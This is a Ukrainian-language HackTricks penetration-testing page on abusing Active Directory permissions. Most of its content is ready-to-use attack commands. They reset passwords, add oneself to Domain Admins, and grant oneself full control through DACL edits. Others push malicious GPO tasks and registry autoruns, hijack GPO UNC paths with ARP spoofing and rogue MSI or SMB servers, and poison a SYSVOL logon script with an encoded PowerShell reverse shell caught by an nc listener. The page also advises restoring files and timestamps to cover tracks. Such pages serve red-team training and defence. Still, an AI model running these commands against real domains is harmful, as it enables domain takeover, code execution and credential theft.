# Зловживання ACL/ACE в Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ця сторінка здебільшого є коротким викладом технік із** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **і** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Для отримання додаткових відомостей перегляньте оригінальні статті.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Права GenericAll для користувача**

Цей привілей надає атакувальнику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl` атакувальник може:

- **Змінити пароль цільового облікового запису**: за допомогою `net user <username> <password> /domain` атакувальник може скинути пароль користувача.
- У Linux можна зробити те саме через SAMR за допомогою Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>.
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Якщо обліковий запис вимкнено, очистіть прапорець UAC**: `GenericAll` дозволяє редагувати `userAccountControl`. У Linux BloodyAD може видалити прапорець `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>.
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Призначити SPN обліковому запису користувача, щоб зробити його придатним для Kerberoasting, а потім використати Rubeus і targetedKerberoast.py для вилучення хешів ticket-granting ticket (TGT) і спроби їх зламати.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Вимкнути попередню автентифікацію для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Маючи `GenericAll` для користувача, можна додати certificate-based credential і автентифікуватися від його імені без зміни пароля. Див.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Права GenericAll для групи**

Цей привілей дозволяє attacker маніпулювати членством у групі, якщо він має права `GenericAll` для такої групи, як `Domain Admins`. Після визначення distinguished name групи за допомогою `Get-NetGroup` attacker може:

- **Додати себе до групи Domain Admins**: Це можна зробити за допомогою прямих команд або використовуючи модулі на кшталт Active Directory чи PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- З Linux також можна використати BloodyAD, щоб додати себе до довільних груп, якщо у вас є права GenericAll/Write щодо них. Якщо цільова група вкладена в “Remote Management Users”, ви одразу отримаєте доступ через WinRM до хостів, які враховують цю групу:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Наявність цих привілеїв на об’єкті комп’ютера або обліковому записі користувача дає змогу:

- **Kerberos Resource-based Constrained Delegation**: дає змогу захопити об’єкт комп’ютера.
- **Shadow Credentials**: використати цю техніку для імперсонації облікового запису комп’ютера або користувача шляхом експлуатації привілеїв для створення shadow credentials.

## **WriteProperty on Group**

Якщо користувач має права `WriteProperty` на всі об’єкти певної групи (наприклад, `Domain Admins`), він може:

- **Add Themselves to the Domain Admins Group**: за допомогою комбінування команд `net user` і `Add-NetGroupUser` цей метод дає змогу підвищити привілеї в домені.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Цей привілей дає зловмисникам змогу додавати себе до певних груп, наприклад `Domain Admins`, за допомогою команд, які безпосередньо змінюють членство в групі. Наведена нижче послідовність команд дає змогу додати себе:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Подібний привілей дозволяє зловмисникам безпосередньо додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` для цих груп. Підтвердження та виконання цього привілею здійснюються за допомогою:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Наявність `ExtendedRight` для користувача щодо `User-Force-Change-Password` дає змогу скинути пароль без знання поточного пароля. Перевірити наявність цього права та використати його можна через PowerShell або альтернативні інструменти командного рядка. Доступно кілька способів скидання пароля користувача, зокрема в інтерактивних сесіях і за допомогою однорядкових команд у неінтерактивних середовищах. Команди варіюються від простих викликів PowerShell до використання `rpcclient` у Linux, демонструючи різноманітність векторів атак.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner над групою**

Якщо attacker виявляє, що має права `WriteOwner` над групою, він може змінити власника групи на себе. Це особливо небезпечно, коли йдеться про групу `Domain Admins`, оскільки зміна власника забезпечує ширший контроль над атрибутами та членством групи. Процес передбачає ідентифікацію правильного об'єкта за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни власника за SID або іменем.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite для користувача**

Цей дозвіл дозволяє зловмиснику змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, зловмисник може змінити шлях до logon script користувача, щоб виконати шкідливий скрипт під час входу користувача в систему. Це робиться за допомогою команди `Set-ADObject`, яка оновлює властивість `scriptpath` цільового користувача, вказуючи на скрипт зловмисника.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite для групи**

Маючи цей привілей, зловмисники можуть керувати членством у групах, наприклад додавати себе або інших користувачів до певних груп. Цей процес передбачає створення credential object, його використання для додавання або видалення користувачів із групи та перевірку змін у членстві за допомогою команд PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- У Linux Samba `net` може додавати/видаляти учасників, якщо ви маєте `GenericWrite` для групи (корисно, коли PowerShell/RSAT недоступні):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Володіння об’єктом AD та наявність привілеїв `WriteDACL` щодо нього дає attacker змогу надати собі привілеї `GenericAll` над цим об’єктом. Це здійснюється за допомогою маніпуляцій ADSI, що забезпечує повний контроль над об’єктом і можливість змінювати його членство в групах. Попри це, під час спроби експлуатувати ці привілеї за допомогою cmdlet’ів `Set-Acl` / `Get-Acl` модуля Active Directory існують обмеження.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Швидке захоплення через WriteDACL/WriteOwner (PowerView)

Якщо ви маєте `WriteOwner` і `WriteDacl` для облікового запису користувача або сервісного облікового запису, ви можете отримати повний контроль і скинути його пароль за допомогою PowerView, не знаючи старого пароля:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Примітки:
- Спочатку може знадобитися змінити власника на себе, якщо у вас є лише `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Перевірте доступ за допомогою будь-якого протоколу (SMB/LDAP/RDP/WinRM) після скидання пароля.

## **Реплікація в домені (DCSync)**

Атака DCSync використовує спеціальні дозволи на реплікацію в домені, щоб імітувати контролер домену та синхронізувати дані, зокрема облікові дані користувачів. Ця потужна техніка потребує таких дозволів, як `DS-Replication-Get-Changes`, що дає змогу зловмисникам отримувати конфіденційну інформацію з середовища AD без прямого доступу до контролера домену.<sup>[[5]](#references)</sup> [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Делегований доступ до керування об'єктами групової політики (GPO) може становити значний ризик для безпеки. Наприклад, якщо користувачу, такому як `offense\spotless`, делеговано права керування GPO, він може мати такі привілеї, як **WriteProperty**, **WriteDacl** і **WriteOwner**. Ці дозволи можуть бути використані зі зловмисною метою, що можна виявити за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Перелік дозволів GPO

Щоб виявити неправильно налаштовані GPO, можна об'єднати cmdlets PowerSploit у ланцюжок. Це дає змогу знайти GPO, якими конкретний користувач має дозволи керувати: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп'ютери, до яких застосовано певну політику**: можна визначити, до яких комп'ютерів застосовується конкретний GPO, що допомагає зрозуміти масштаб потенційного впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до певного комп'ютера**: щоб переглянути політики, застосовані до конкретного комп'ютера, можна використовувати такі команди, як `Get-DomainGPO`.

**OU, до яких застосовано певну політику**: визначити організаційні одиниці (OU), на які поширюється певна політика, можна за допомогою `Get-DomainOU`.

Також можна використовувати інструмент [**GPOHound**](https://github.com/cogiceo/GPOHound), щоб перелічити GPO та знайти в них проблеми.

### Зловживання GPO - New-GPOImmediateTask

Неправильно налаштовані GPO можна використати для виконання коду, наприклад створивши негайне заплановане завдання. Це можна зробити, щоб додати користувача до локальної групи адміністраторів на вразливих комп'ютерах, значно підвищивши привілеї:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Модуль GroupPolicy, якщо він встановлений, дозволяє створювати та пов’язувати нові GPO, а також встановлювати параметри, як-от значення реєстру, для виконання backdoors на уражених комп’ютерах. Для цього методу потрібно оновити GPO, а користувач має увійти до комп’ютера для виконання:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Зловживання GPO

SharpGPOAbuse надає спосіб зловживати наявними GPO, додаючи завдання або змінюючи налаштування без необхідності створювати нові GPO. Цей інструмент потребує модифікації наявних GPO або використання інструментів RSAT для створення нових перед застосуванням змін:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Примусове оновлення політики

Оновлення GPO зазвичай відбувається приблизно кожні 90 хвилин. Щоб пришвидшити цей процес, особливо після внесення змін, на цільовому комп'ютері можна використати команду `gpupdate /force`, щоб примусово виконати негайне оновлення політики. Ця команда гарантує застосування всіх змін до GPO без очікування наступного автоматичного циклу оновлення.

### Під капотом

Під час перевірки Scheduled Tasks для певної GPO, наприклад `Misconfigured Policy`, можна підтвердити додавання таких завдань, як `evilTask`. Ці завдання створюються за допомогою скриптів або інструментів командного рядка, призначених для зміни поведінки системи чи підвищення привілеїв.

Структура завдання, наведена у файлі конфігурації XML, згенерованому за допомогою `New-GPOImmediateTask`, описує параметри Scheduled Task - зокрема команду, яку потрібно виконати, і її тригери. Цей файл демонструє, як Scheduled Tasks визначаються та керуються в GPO, забезпечуючи спосіб виконання довільних команд або скриптів у межах застосування політики.

### Користувачі та групи

GPO також дають змогу змінювати членство користувачів і груп у цільових системах. Безпосередньо редагуючи файли політик Users and Groups, attackers можуть додавати користувачів до привілейованих груп, таких як локальна група `administrators`. Це можливо завдяки делегуванню дозволів на керування GPO, яке дає змогу змінювати файли політик, додаючи нових користувачів або змінюючи членство в групах.

Файл конфігурації XML для Users and Groups описує спосіб реалізації цих змін. Додаючи записи до цього файлу, можна надати певним користувачам підвищені привілеї в усіх уражених системах. Цей метод забезпечує прямий шлях до privilege escalation через маніпуляції з GPO.

Крім того, можна розглянути додаткові методи виконання code або збереження persistence, зокрема використання logon/logoff scripts, зміну registry keys для autoruns, встановлення software через файли .msi або редагування конфігурацій services. Ці techniques створюють різні можливості для збереження доступу та керування цільовими системами через зловживання GPO.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` для OU/domain дає змогу змінити атрибут `gPLink` цільового контейнера та **змусити наявну GPO застосуватися**, не редагуючи саму GPO. Це стає цікавим, коли пов'язана GPO вже посилається на віддалений контент через **UNC paths** (`\\HOST\share\...`), оскільки authenticated users можуть читати **SYSVOL** і шукати offline придатні для повторного використання policies.<sup>[[11]](#references)</sup>

Загальний workflow:

1. Використайте BloodHound, щоб визначити principal із `WriteGPLink` для OU, і перелічіть computers/users у цій OU.
2. Клонуйте `SYSVOL` у режимі read-only та проаналізуйте GPO, шукаючи **Software Installation**, **drive mappings** (`Drives.xml`) і **logon/startup scripts**, які посилаються на UNC paths.
3. Надавайте перевагу policies, що вказують на **direct hostname** (наприклад, `\\DC02\share\pkg.msi`), а не на DFS/domain-namespace paths, оскільки hostname-based paths легше перенаправити за допомогою L2 spoofing.
4. Додайте GUID вибраної GPO до `gPLink` цільової OU, щоб victim обробив цю вже наявну policy.
5. У тому самому broadcast domain виконайте ARP spoofing UNC host і прив'яжіть його IP локально (`ip addr add <target_ip>/32 dev <iface>`), щоб SMB traffic victim's systems надходив на ваш host.
6. Надайте очікувані path/filename з attacker SMB server (наприклад, `smbserver.py`) і дочекайтеся звичайної обробки policy.

Приклад збору `SYSVOL` і кореляції GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Прив’яжіть наявний GPO до цільового OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Перехоплення UNC у Software Installation -> SYSTEM

Якщо пов’язаний GPO розгортає MSI з UNC-шляху, клієнт отримає його під час **запуску комп’ютера** та встановить як **`NT AUTHORITY\SYSTEM`**. Підмінивши вказаний хост і розмістивши шкідливий MSI за **тим самим шляхом/іменем спільного ресурсу**, можна перетворити `WriteGPLink` на виконання коду з привілеями SYSTEM **без модифікації SYSVOL**.

Важливі обмеження:

- **Час має значення**: нове посилання буде виявлено під час оновлення політики (зазвичай приблизно через ~90 хвилин), але **Software Installation** зазвичай запускається під час **перезавантаження**.
- Windows Installer зазвичай відстежує розгортання за допомогою **`ProductCode`** пакета. Якщо продукт уже встановлено, розгортання може бути пропущено.
- Щоб уникнути відхилення інсталятором, виправте rogue MSI так, щоб його **`ProductCode`** і **`PackageCode`** відповідали легітимному пакету, очікуваному GPO.
- Старі файли оголошень `.aas` можуть залишатися в `SYSVOL`, тому перевірте, чи розгортання все ще виглядає активним, перш ніж покладатися на нього.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` спричиняють автентифікацію користувачів до налаштованого UNC-шляху під час входу або повторного підключення. Якщо підмінити вказаний host, можна захопити **NetNTLMv2**. Якщо навмисно змусити SMB завершитися помилкою, Windows може повторити спробу через **WebDAV**, надсилаючи **NTLM через HTTP**, що забезпечує значно більше можливостей для relay до **LDAP(S)**, **AD CS** або **SMB**.

#### Logon/startup script UNC hijack

Той самий підхід застосовується до скриптів, розміщених на UNC-шляхах і виявлених у `SYSVOL`:

- **Logon scripts** зазвичай виконуються в контексті **користувача**.
- **Startup scripts** зазвичай виконуються в контексті **комп’ютера / SYSTEM**.

Якщо шлях до скрипта вказує на hostname, який можна підмінити, перенаправте UNC host і розмістіть замінений вміст скрипта в очікуваному location.

## SYSVOL/NETLOGON Logon Script Poisoning

Шляхи з можливістю запису в `\\<dc>\SYSVOL\<domain>\scripts\` або `\\<dc>\NETLOGON\` дають змогу змінювати logon scripts, які виконуються під час входу користувача через GPO. Це забезпечує виконання коду в контексті безпеки користувачів, які входять у систему.

### Locate logon scripts
- Перевірте атрибути користувача на наявність налаштованого logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Виконуйте пошук у доменних спільних ресурсах, щоб виявити ярлики або посилання на скрипти:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Аналізуйте файли `.lnk`, щоб визначити цілі, які вказують на SYSVOL/NETLOGON (корисний трюк DFIR і для атакувальників без прямого доступу до GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound відображає атрибут `logonScript` (scriptPath) на вузлах користувачів, якщо він присутній.

### Перевірка доступу на запис (не довіряйте спискам спільних ресурсів)
Автоматизовані інструменти можуть показувати SYSVOL/NETLOGON як доступні лише для читання, але базові NTFS ACL все одно можуть дозволяти запис. Завжди перевіряйте:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Якщо розмір файлу або mtime змінюється, у вас є write. Збережіть оригінали перед внесенням змін.

### Poison a VBScript logon script for RCE
Додайте команду, яка запускає PowerShell reverse shell (згенеруйте його на revshells.com), і збережіть оригінальну логіку, щоб не порушити бізнес-функціональність:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Прослуховуйте свій хост і очікуйте наступного інтерактивного входу:
```bash
rlwrap -cAr nc -lnvp 443
```
Примітки:
- Виконання відбувається з токеном користувача, який виконує вхід (не SYSTEM). Область дії — це прив’язка GPO (OU, site або domain), до якої застосовується цей скрипт.
- Після використання відновіть початковий вміст і часові мітки.


## Посилання

- [1] [Зловживання Active Directory ACL/ACE](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Привілейовані облікові записи та привілеї токенів](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – оновлення шляху атаки ACL](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Підвищення привілеїв за допомогою ACL в Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Сканування привілеїв Active Directory та привілейованих облікових записів](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – операції з атрибутами AD/UAC з Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (членство в групах)](https://www.samba.org/)
- [10] [HTB Puppy: зловживання AD ACL, підбір Argon2 KeePassXC і розшифрування DPAPI до отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: перехоплення UNC-шляхів GPO для виконання коду та NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
